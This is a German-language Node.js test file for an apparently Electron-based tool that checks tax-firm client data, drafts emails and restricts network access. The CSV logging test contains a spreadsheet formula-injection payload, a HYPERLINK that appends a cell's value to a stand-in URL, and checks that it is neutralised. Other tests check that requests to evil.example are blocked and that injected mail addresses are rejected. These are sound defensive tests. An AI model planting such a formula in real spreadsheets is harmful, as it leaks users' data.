// node --test tests/  — Prüfregeln, Demo-Quelle, .eml-Aufbau, Protokoll
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { pruefeIban, pruefeSteuerId } = require("../electron/pruefung.cjs");
const { demoQuelle, ladeMandanten } = require("../electron/datev.cjs");
const { baueEml, erstelleMails } = require("../electron/versand.cjs");
const { oeffneAblage } = require("../electron/ablage.cjs");

test("Prüfziffern", () => {
  assert.ok(pruefeIban("DE89 3704 0044 0532 0130 00"));
  assert.ok(!pruefeIban("DE89370400440532013001"));
  assert.ok(pruefeSteuerId("86095742719"));
  assert.ok(!pruefeSteuerId("86095742718"));
  assert.ok(!pruefeSteuerId("06095742719"));
});

test("Lücken der sieben Testfälle, Sammelabfragen verknüpft", async () => {
  const schritte = [];
  const { mandanten: m, auftragswesen } = await ladeMandanten(demoQuelle(), true, (f, g) => schritte.push([f, g]));
  const kurz = Object.fromEntries(m.filter((x) => x.nummer < 10010).map((x) => [x.nummer, x.abruffehler ? "abruf" : `${x.luecken}|${x.fehlerhaft}`]));
  assert.deepEqual(kurz, {
    10001: "|",
    10002: "email,iban|",
    10003: "telefon,geburtsdatum|email,steuerid,iban",
    10004: "steuernummer,finanzamt,zustaendig|",
    10006: "telefon,anschrift,briefanrede,geburtsdatum,steuernummer,finanzamt,steuerid,iban,zustaendig|",
    10007: "abruf",
  });
  const krümel = m.find((x) => x.nummer === 10002);
  assert.equal(krümel.rechtsform, "GmbH");
  assert.equal(krümel.ustid, "DE123456789");
  assert.deepEqual(krümel.aufgabenbereiche.map((a) => a.bereich).sort(), ["Finanzbuchführung", "Jahresabschluss", "Lohn und Gehalt"]);
  assert.ok(krümel.datevGruppen.includes("A-Mandant"));
  assert.equal(m.find((x) => x.nummer === 10004).anrede, "Sehr geehrter Herr Pinsel,");
  assert.equal(m.find((x) => x.nummer === 10001).auftraege.some((a) => a.art === "EST" && a.status === "in work"), true);
  assert.equal(auftragswesen, true);
  assert.deepEqual(schritte.at(-1), [m.length, m.length]);
  assert.equal(m.every((x) => x.status === "active"), true);
  assert.equal((await ladeMandanten(demoQuelle(), false)).mandanten.length, 27);
});

test("Mehrere E-Mails mit Herkunft, Beziehungen, Gesellschafter-Mails", async () => {
  const { mandanten: m } = await ladeMandanten(demoQuelle(), true);
  const nr = (n) => m.find((x) => x.nummer === n);
  const anna = nr(10001);
  assert.equal(anna.email, "anna.muster@example.com");
  assert.deepEqual(anna.emails.map((e) => [e.adresse, e.rolle, e.notiz, e.eigen]), [
    ["anna.muster@example.com", "Person", null, true], ["praxis@muster-physio.example", "Person", "geschäftlich (Praxis)", true]]);
  assert.ok(anna.beziehungen.includes("ist Gesellschafter von Bäckerei Krümel GmbH (10002)"));
  // GmbH ohne eigene Mail: erreichbar über die Gesellschafter, Lücke bleibt
  const kruemel = nr(10002);
  assert.equal(kruemel.email, null);
  assert.ok(kruemel.luecken.includes("email"));
  assert.deepEqual(kruemel.emails.map((e) => `${e.rolle}:${e.adresse}`), ["Gesellschafter:anna.muster@example.com", "Gesellschafter:katrin.hartmann@example.com"]);
  assert.deepEqual(kruemel.verbund, ["Bäckerei Krümel GmbH"]);
  // Einzelunternehmen: Inhaber privat + Unternehmen, Standard = Unternehmen
  const maler = nr(10004);
  assert.equal(maler.email, "info@malerbetrieb-test.example");
  assert.deepEqual(maler.emails.map((e) => `${e.rolle}:${e.notiz}`), ["Inhaber:privat", "Unternehmen:null"]);
  // Gesellschafter ohne eigenen Mandanten + Ansprechpartner doppelt → einmal
  const nowak = nr(10026);
  assert.deepEqual(nowak.emails.map((e) => e.adresse), ["info.nowak-maschinenbau@example.com", "buchhaltung.nowak-maschinenbau@example.com", "ralf.nowak@example.com", "petra.nowak@example.com"]);
  assert.ok(nowak.beziehungen.includes("Gesellschafter: Nowak, Ralf"));
  assert.ok(nr(10011).beziehungen.includes("ist Ehegatte von Hartmann, Katrin (10010)"));
});

test("Mail an mehrere Adressen", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
  assert.match(baueEml({ an: ["a@example.com", "b@example.com"], betreff: "x", text: "y" }), /\r\nBcc: a@example.com,\r\n b@example.com\r\n/);
  const erg = await erstelleMails({ modus: "entwurf", mails: [
    { nummer: 1, name: "A", an: ["a@example.com", "b@example.com"], betreff: "B", text: "T", anhaenge: [] },
    { nummer: 2, name: "B", an: ["a@example.com", "kaputt"], betreff: "B", text: "T", anhaenge: [] },
    { nummer: 3, name: "C", an: [], betreff: "B", text: "T", anhaenge: [] },
  ] }, { versand: "eml", ausgang: dir, tmp: dir });
  assert.deepEqual(erg.map((e) => e.ok), [true, false, false]);
});

test(".eml: lange Betreffs gefaltet, Adressen mit Trennern abgelehnt, Outlook-Abbruch meldet jede Mail", async () => {
  const eml = baueEml({ an: ["a@example.com"], betreff: "Ä".repeat(600), text: "y" });
  assert.ok(eml.split("\r\n").every((z) => z.length <= 78), "keine Kopfzeile über 78 Zeichen");
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
  const erg = await erstelleMails({ modus: "entwurf", mails: [
    { nummer: 1, name: "A", an: ["a@x.de;Müller"], betreff: "B", text: "T", anhaenge: [] },
    { nummer: 2, name: "B", an: ["<a@x.de>"], betreff: "B", text: "T", anhaenge: [] },
  ] }, { versand: "eml", ausgang: dir, tmp: dir });
  assert.deepEqual(erg.map((e) => e.ok), [false, false]);
  await assert.rejects(erstelleMails({ modus: "senden", mails: [] }, { versand: "eml", ausgang: dir, tmp: dir }), /Nur Entwürfe/);
  // Ohne PowerShell/Outlook (hier Linux): jede Mail kommt mit Nummer als Fehler zurück, Zwischendatei ist weg
  const tmp = path.join(dir, "tmp");
  const o = await erstelleMails({ modus: "entwurf", mails: [{ nummer: 7, name: "X", an: ["a@x.de"], betreff: "B", text: "T", anhaenge: [] }] }, { versand: "outlook", ausgang: dir, tmp });
  assert.equal(o[0].nummer, 7);
  assert.equal(o[0].ok, false);
  assert.deepEqual(fs.readdirSync(tmp), []);
});

test("Register nur bei Pflicht, Auftragswesen fehlt ohne Absturz", async () => {
  const { pruefeMandant } = require("../electron/pruefung.cjs");
  const rf = new Map([["GBR", { short_name: "GbR" }], ["GMBH", { short_name: "GmbH" }]]);
  const firma = (form) => [{ type: "legal_person", current_legal_form_id: form, eu_vat_id_number: "1", detail: { salutation: "x" } }];
  const z = { zustaendigkeiten: [{ employee_id: "e" }], rechtsformen: rf };
  assert.ok(!pruefeMandant({ type: "legal_person" }, firma("GBR"), z).luecken.includes("register"));
  assert.ok(pruefeMandant({ type: "legal_person" }, firma("GMBH"), z).luecken.includes("register"));
  const q = demoQuelle();
  const ohneEO = { stamm: q.stamm, auftrag: async () => { throw new Error("404"); } };
  const r = await ladeMandanten(ohneEO, true);
  assert.equal(r.auftragswesen, false);
  assert.ok(r.mandanten.length > 20);
});

test(".eml mit Anhängen und Umlauten", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
  const a = path.join(dir, "Merkblatt Übersicht.pdf");
  fs.writeFileSync(a, "%PDF-1.4 Test");
  const eml = baueEml({ an: "x@example.com", betreff: "Prüfung", text: "Grüße\nZeile 2" }, [a]);
  assert.match(eml, /^X-Unsent: 1\r\nBcc: x@example.com\r\n/);
  assert.match(eml, /multipart\/mixed/);
  assert.ok(eml.includes(Buffer.from("%PDF-1.4 Test").toString("base64")));
  assert.ok(eml.includes(Buffer.from("Merkblatt Übersicht.pdf").toString("base64")));

  const erg = await erstelleMails({ modus: "entwurf", mails: [
    { nummer: 1, name: "A", an: "a@example.com", betreff: "B", text: "T", anhaenge: [a] },
    { nummer: 2, name: "B", an: "kaputt", betreff: "B", text: "T", anhaenge: [] },
    { nummer: 3, name: "C", an: "c@example.com", betreff: "B", text: "T", anhaenge: [path.join(dir, "fehlt.pdf")] },
  ] }, { versand: "eml", ausgang: path.join(dir, "aus"), tmp: path.join(dir, "tmp") });
  assert.deepEqual(erg.map((e) => e.ok), [true, false, false]);
  assert.equal(fs.readdirSync(path.join(dir, "aus")).length, 1);
  await assert.rejects(erstelleMails({ modus: "senden", mails: [] }, { versand: "eml" }));
});

test("Protokoll und Einstellungen", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
  const ab = oeffneAblage(dir);
  ab.protokolliere([{ Zeit: "1", Modus: "eml", Vorlage: "V", Mandantennr: 5, Mandant: 'Krümel "GmbH"; Test', An: "a@b.de", Betreff: "x", Ergebnis: "ok", Anhaenge: "a.pdf" }]);
  assert.deepEqual(ab.protokoll()[0].Mandant, 'Krümel "GmbH"; Test');
  assert.equal(ab.speichereEinstellungen({ versand: "quatsch", demo: true }).versand, "eml");
  assert.equal(ab.einstellungen().demo, true);
  assert.equal(ab.vorlagen().length, 2);
});

test("Excel-Formeln im Protokoll entschärft, beim Lesen unverändert", () => {
  const { csvZeile } = require("../electron/ablage.cjs");
  assert.equal(csvZeile(['=HYPERLINK("http://x?"&A2)', "+49 341 1", "@SUM(1)", "-2", "ok"]), `"'=HYPERLINK(""http://x?""&A2)";"'+49 341 1";"'@SUM(1)";"'-2";"ok"`);
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
  const ab = oeffneAblage(dir);
  ab.protokolliere([{ Zeit: "1", Mandant: "=1+1", Betreff: "+SUM(1)" }]);
  assert.equal(ab.protokoll()[0].Mandant, "=1+1");
  assert.ok(fs.readFileSync(path.join(dir, "protokoll.csv"), "utf8").includes(`"'=1+1"`));
});

test("Kaputte Dateien im Datenordner legen die App nicht lahm", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kh-"));
  fs.writeFileSync(path.join(dir, "ansicht.json"), JSON.stringify({ spalten: "abc", sort: { id: 1 }, gruppe: 5, boese: "<img>" }));
  fs.writeFileSync(path.join(dir, "vorlagen.json"), JSON.stringify([null, { id: 1, name: { x: 1 } }]));
  fs.writeFileSync(path.join(dir, "gruppen.json"), JSON.stringify([{ id: "g", name: "", mitglieder: "1,2" }]));
  fs.writeFileSync(path.join(dir, "einstellungen.json"), JSON.stringify({ demo: "false", versand: ["eml"], regeln: { email: "nein", quatsch: false } }));
  const ab = oeffneAblage(dir);
  assert.deepEqual(ab.ansicht(), {});
  assert.deepEqual(ab.vorlagen(), [{ id: "1", name: "[object Object]", betreff: "", text: "" }]);
  assert.deepEqual(ab.gruppen(), [{ id: "g", name: "Gruppe", mitglieder: [] }]);
  const e = ab.einstellungen();
  assert.equal(e.demo, false);
  assert.equal(e.versand, "eml");
  assert.deepEqual(e.regeln, {});
  fs.mkdirSync(path.join(dir, "tmp"));
  fs.writeFileSync(path.join(dir, "tmp", "auftrag-1.json"), "{}");
  ab.raeumeTmp();
  assert.ok(!fs.existsSync(path.join(dir, "tmp")));
});

test("Netz: nur DATEVconnect im eigenen Netz, Adresse wie eingetragen", async () => {
  const { datevAdresse, datevBasis, privateAdresse, pruefeImKanzleinetz, sichererAbruf, DATEV_STANDARD } = require("../electron/netz.cjs");
  // Adresse: bleibt wie eingetragen (keine Prüfung); leer/alter Standard → neuer Standard
  assert.equal(DATEV_STANDARD, "https://LIZENZSERVER:58452/datev/api/master-data/v1");
  const link = "https://lizenzserver:58452/datev/api/master-data/v1/clients?select=number,name&filter=status%20eq%20active";
  assert.equal(datevAdresse(link), link);
  assert.equal(datevAdresse("  quatsch "), "quatsch");
  for (const e of ["", "   ", "http://LIZENZSERVER:58454/datev/api/master-data/v1", "http://lizenzserver:58454/datev/api/master-data/v1/"]) assert.equal(datevAdresse(e), DATEV_STANDARD, e);
  // Basis für die Abfragen: Browser-Adresse → …/master-data/v1, ohne Schema → https
  const basis = "https://lizenzserver:58452/datev/api/master-data/v1";
  for (const e of [link, "lizenzserver:58452/datev/api/master-data/v1", "  https://lizenzserver:58452/datev/api/master-data/v1/  ", "https://LIZENZSERVER:58452/datev/api/master-data/v1#x"]) assert.equal(datevBasis(e), basis, e);
  assert.equal(datevBasis("http://192.168.1.5:58454/datev/api/master-data/v1/clients"), "http://192.168.1.5:58454/datev/api/master-data/v1");
  assert.equal(datevBasis("http://srv:8080/anderer/pfad/?x=1"), "http://srv:8080/anderer/pfad");
  assert.equal(datevBasis(""), DATEV_STANDARD.replace("LIZENZSERVER", "lizenzserver"));
  for (const ip of ["10.0.0.1", "172.16.0.1", "172.31.255.255", "192.168.178.20", "127.0.0.1", "169.254.1.1", "::1", "fd00::1", "fe80::1", "::ffff:192.168.0.1"]) assert.ok(privateAdresse(ip), ip);
  for (const ip of ["8.8.8.8", "172.32.0.1", "100.64.0.1", "2a00:1450::1", "::ffff:8.8.8.8", "0.0.0.0"]) assert.ok(!privateAdresse(ip), ip);
  await pruefeImKanzleinetz("LIZENZSERVER", async () => [{ address: "192.168.0.10" }]);
  await assert.rejects(pruefeImKanzleinetz("LIZENZSERVER", async () => [{ address: "192.168.0.10" }, { address: "52.1.2.3" }]), /nicht im eigenen Netz/);
  await assert.rejects(pruefeImKanzleinetz("x", async () => []), /nicht im eigenen Netz/);
  // Abruf: falscher Ursprung gesperrt; sonst GET, ohne Weiterleitung (Cookies/Anmeldung regelt holeMitWindowsKonto in haupt.cjs)
  const aufrufe = [];
  const abruf = sichererAbruf(async (u, o) => { aufrufe.push([u, o]); return { status: 200 }; }, () => "http://lizenzserver:58454", { nachschlagen: async () => [{ address: "10.0.0.2" }] });
  await abruf("http://lizenzserver:58454/datev/api/master-data/v1/clients", { method: "POST" });
  assert.equal(aufrufe[0][1].method, "GET");
  assert.equal(aufrufe[0][1].redirect, "error");
  assert.ok(!("credentials" in aufrufe[0][1]));
  await assert.rejects(abruf("http://evil.example/datev/api/master-data/v1/clients"), /Gesperrt/);
  const mitAnmeldung = sichererAbruf(async () => ({ status: 401 }), () => "http://lizenzserver:58454", { nachschlagen: async () => [{ address: "10.0.0.2" }] });
  await assert.rejects(mitAnmeldung("http://lizenzserver:58454/datev/api/master-data/v1/version"), /Windows-Konto nicht zu \(401\)/);
  // https: gleicher Ursprung nötig (Schema + Server + Port), sonst gesperrt
  const sicher = sichererAbruf(async () => ({ status: 200 }), () => "https://lizenzserver:58452", { nachschlagen: async () => [{ address: "10.0.0.2" }] });
  assert.equal((await sicher("https://lizenzserver:58452/datev/api/master-data/v1/clients")).status, 200);
  await assert.rejects(sicher("http://lizenzserver:58452/datev/api/master-data/v1/clients"), /Gesperrt/);
  const fremdesZertifikat = sichererAbruf(async () => { throw new TypeError("net::ERR_CERT_AUTHORITY_INVALID"); }, () => "https://lizenzserver:58452", { nachschlagen: async () => [{ address: "10.0.0.2" }] });
  await assert.rejects(fremdesZertifikat("https://lizenzserver:58452/datev/api/master-data/v1/clients"), /vertraut dem Zertifikat/);
});
